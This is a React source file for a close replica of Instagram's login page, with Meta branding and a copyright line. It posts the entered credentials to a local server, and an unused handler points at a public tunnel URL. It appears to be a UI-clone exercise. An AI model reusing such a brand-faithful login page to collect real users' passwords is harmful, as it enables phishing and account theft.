import React, { useState, useEffect } from "react";
import logo from "../src/images/logo.png";
import reelpic from "../src/images/reelpic.png";
import fbLogo from "../src/images/fb_logo2.png";
import { useNavigate } from "react-router-dom";

function login() {
   
    const [loginForm, setLoginForm] = useState({
        email: "",
        password: ""

    });

    const [errorLogin, seterrorLogin] = useState({});

    const handleChange = (e) => {
        const { name, value } = e.target;

        const updatedFormLogin = {
            ...loginForm,
            [name]: value,
        };

        setLoginForm(updatedFormLogin);

        let newloginError = { ...errorLogin };


        if (name === "email") {
            const isPhone = /^\d+$/.test(value);
            const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);

            if (!value.trim()) {
                newloginError.email = "Please enter a valid mobile number or email address.";
            } else if (isPhone && value.length !== 10) {
                newloginError.email = "Mobile number should be of 10 digits";
            } else if (!isPhone && !isEmail) {
                newloginError.email = "Please enter a valid email address";
            } else {
                delete newloginError.email;
            }
        }

        if (name === "password") {
            if (!value.trim()) {
                newloginError.password = "Enter a valid password";
            } else if (value.length < 6) {
                newloginError.password = "Password must be atleast 6 characters";
            } else {
                delete newloginError.password;
            }
        }

        if (errorLogin[name]) {
            delete newloginError[name];
        }

    }

    const validateForm = () => {
        let newloginError = {};

        if (!loginForm.email.trim()) {
            newloginError.email = "Please enter a valid mobile number or email address.";
        }

        if (!loginForm.password) {
            newloginError.password = "Enter Password";
        }

        seterrorLogin(newloginError);

        return Object.keys(newloginError).length === 0;
    };


    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!validateForm()) {
            return;
        }

        console.log("✅ Form Submitted Successfully!");


        try {
            const response = await fetch("http://localhost:5000/signin", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                credentials: "include",
                body: JSON.stringify({
                    email: loginForm.email,
                    password: loginForm.password

                })
            });


            const data = await response.json();
            console.log("Response:", data);

            if (response.ok) {
                navigate("/dashboard");
                window.location.reload();
            }
            else {
                alert(data.error || "Something went wrong");
            }


        } catch (error) {
            console.error("Error:", error);
            alert("Server error");

        }
    }






    // Authentication
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("")
    const navigate = useNavigate();

    const handleLogin = async () => {
        if (!username || !password) {
            alert("Please enter username and password");
            return;
        }

        try {
            const res = await fetch("https://kz9sppkz-5000.inc1.devtunnels.ms/login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ username, password })
            });

            const data = await res.json();

            if (data.status === "success") {
                localStorage.setItem("auth", "true");
                window.location.href = "/dashboard";   // Force reload for safety
            } else {
                alert(data.message || "Invalid Credentials");
            }
        } catch (err) {
            console.error("Login Error:", err);
            alert("Cannot connect to server. Make sure Flask is running on port 5000.");
        }
    };

    return (

        <div className="flex flex-col min-h-screen">

            <div className="flex flex-col lg:flex-row flex-1 p-0">

                {/* Left Black */}
                <div className="bg-black w-full  lg:w-[65%] border-r-2 border-[#494D53] p-13">
                    <img src={logo} className="lg:w-19 w-15  mx-auto lg:mx-0"></img>
                    <h1 className="text-white text-[2.55rem] pb-0 ms-2 font-medium text-center p-5 lg:block hidden" style={{ fontFamily: "Helvetica, Arial, sans-serif" }} >See everyday moments from your
                        <span className="text-center text-[2.35rem] font-medium lg:block hidden" style={{ background: "linear-gradient(90deg, #FF4718, #FF5903, #ff0069, #d300c5, #DD00B0)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent", }} >
                            close friends.
                        </span>
                    </h1>
                    <figure>
                        <img src={reelpic} className=" mx-auto lg:block hidden w-full xl:w-4/6 2xl:w-full"></img>
                    </figure>
                </div>

                {/* Right Gray */}
                <div className="bg-[#1F1F22] w-full  lg:w-1/2  pt-14 pb-14 lg:pt-16 lg:pb-16  ">
                    <form onSubmit={handleSubmit} method="POST" className="p-10 bg-[#1F1F22]">
                        <h3 className="text-[#F2F4F6] font-medium text-lg space-y-4">Log into Instagram</h3><br></br>



                        <div className="relative w-full mb-4">

                            <input
                                type="text"
                                name="email"
                                placeholder=" "
                                value={loginForm.email}
                                onChange={handleChange}
                                className={`peer w-full autofill:bg-[#1F1F22] p-4 pt-6 bg-transparent border border-[#50545B] rounded-[15px] text-white outline-none focus:border-blue-500 hover:border-white
                                     ${errorLogin.email
                                        ? "border border-[#FB7D87] text-[#FB7D87] focus:border-[#FB7D87]"
                                        : "border border-[#50545B] text-white focus:border-blue-500 hover:border-white"
                                    }`}
                            />

                            {errorLogin.email && <p className="text-[#FB7D87] text-sm mt-2 ml-1 mb-2">{errorLogin.email}</p>}


                            <label
                                className={`absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-base transition-all
                                     ${errorLogin.email
                                        ? "text-[#FB7D87]  peer-placeholder-shown:top-7.5"
                                        : "text-gray-400 peer-focus:text-blue-500"
                                    }

                                peer-placeholder-shown:top-1/2
                                peer-placeholder-shown:text-base
                                peer-focus:top-3
                                peer-focus:text-sm
                                peer-focus:text-blue-500
                                peer-not-placeholder-shown:top-4
                                peer-not-placeholder-shown:text-sm `}
                            >
                                Mobile number, username or email
                            </label>

                        </div>

                        <div className="relative w-full mb-4">

                            <input
                                type="password"
                                name="password"
                                placeholder=" "
                                value={loginForm.password}
                                onChange={handleChange}
                                className={`peer w-full p-4 pt-6 bg-transparent border border-[#50545B] rounded-[15px] text-white outline-none focus:border-blue-500 hover:border-white
                                            ${errorLogin.password
                                        ? "border border-[#FB7D87] text-[#FB7D87] focus:border-[#FB7D87]"
                                        : "border border-[#50545B] text-white focus:border-blue-500 hover:border-white"
                                    }`}
                            />

                            {errorLogin.password && <p className="text-[#FB7D87] text-sm mt-2 ml-1 mb-">{errorLogin.password}</p>}


                            <label
                                className={`absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-base transition-all
                                         ${errorLogin.password
                                        ? "text-[#FB7D87] peer-placeholder-shown:top-7.5"
                                        : "text-gray-400 peer-focus:text-blue-500"
                                    }

                                peer-placeholder-shown:top-1/2
                                peer-placeholder-shown:text-base
                                peer-focus:top-3
                                peer-focus:text-sm
                             peer-focus:text-blue-500
                                peer-not-placeholder-shown:top-4
                                peer-not-placeholder-shown:text-sm`}
                            >
                                Password
                            </label>
                        </div>

                        <button type="submit" className="border border-[#0064E0] cursor-not-allowed p-2.5 w-full rounded-[100px] text-white bg-[#0064E0] font-medium hover:bg-[#015bc8] hover:text-[#c8c8c8] ">Log in</button>

                        <button className="border border-none p-2.5 w-full rounded-[100px] text-white  font-medium hover:bg-[#363638] cursor-pointer mt-4 hover:text-white">Forgot password?</button>

                        <button type="button" className="border border-[#50545B] p-2.5 w-full rounded-[100px] text-white font-medium hover:bg-[#363638] cursor-pointer mt-15 flex items-center justify-center gap-2"> <img src={fbLogo} className="w-6" />Log in with Facebook </button>

                        <button className="border border-[#4BA9FE] p-2.5 w-full rounded-[100px] text-[#4BA9FE]  font-medium hover:bg-[#363638] cursor-pointer mt-4 ">Create new account</button>

                        <svg aria-label="Meta logo" className="w-15 mt-5 mx-auto" role="img" viewBox="0 0 500 100">
                            <path
                                d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
                                fill="#DEE3E9"></path>
                            <path
                                d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
                                fill="#DEE3E9"></path>
                        </svg>







                    </form>
                </div>

            </div>

            {/* FOOTER (FULL WIDTH) */}
            <div className="bg-black text-white text-center py-4 p-3 border-t border-[#494D53]">
                <nav className="inline-block text-sm mx-auto ">
                    <ul className="flex flex-wrap justify-center gap-4 text-[#737476] text-xs list-none [&>a]:hover:underline ">
                        <a href="#">Meta</a>
                        <a href="#">About</a>
                        <a href="#">Blog</a>
                        <a href="#">Jobs</a>
                        <a href="#">Help</a>
                        <a href="#">API</a>
                        <a href="#">Privacy</a>
                        <a href="#">Terms</a>
                        <a href="#">Locations</a>
                        <a href="#">Instagram Lite</a>
                        <a href="#">Meta AI</a>
                        <a href="#">Threads</a>
                        <a href="#">Contact Uploading & Non-Users</a>
                        <a href="#">Meta Verified</a>

                    </ul>
                </nav>

                <div className="flex justify-center items-center gap-4 text-[#737476] text-xs mt-3"></div>

                <select className="bg-black text-[#737476] text-xs px-3 py-1 rounded-md outline-none cursor-pointer w-16">
                    <option>English</option>
                    <option>Afrikaans</option>
                    <option>العربية</option>
                    <option>Čeština</option>
                    <option>Dansk</option>  
                    <option>Deutsch</option>
                    <option>Ελληνικά</option>
                    <option>English (UK)</option>
                    <option>Español (España)</option>
                    <option>Español</option>
                    <option>فارسی</option>
                    <option>Suomi</option>
                    <option>Français</option>
                    <option>עברית</option>
                    <option>Bahasa Indonesia</option>
                    <option>Italiano</option>
                    <option>日本語</option>
                    <option>한국어</option>
                    <option>Bahasa Melayu</option>
                    <option>Norsk</option>
                    <option>Polski</option>
                    <option>Português (Brasil)</option>
                    <option>Português (Portugal)</option>
                    <option>Русский</option>
                    <option>Svenska</option>
                    <option>ภาษาไทย</option>
                    <option>Filipino</option>
                    <option>Türkçe</option>
                    <option>中文(简体)</option>
                    <option>中文(台灣)</option>
                    <option>বাংলা</option>
                    <option>ગુજરાતી</option>
                    <option>हिन्दी</option>
                    <option>Hrvatski</option>
                    <option>Magyar</option>
                    <option>ಕನ್ನಡ</option>
                    <option>മലയാളം</option>
                    <option>मराठी</option>
                    <option>नेपाली</option>
                    <option>ਪੰਜਾਬੀ</option>
                </select>


                <h6 className="mx-auto text-xs mt-3 text-[#737476] inline" > &nbsp; © 2026 Instagram from Meta</h6>
                <h6 className="mx-auto text-xs mt-3 text-[#737476]" >Made with ❤️ by Gaurav</h6>

            </div>







        </div>




    );
}

export default login;  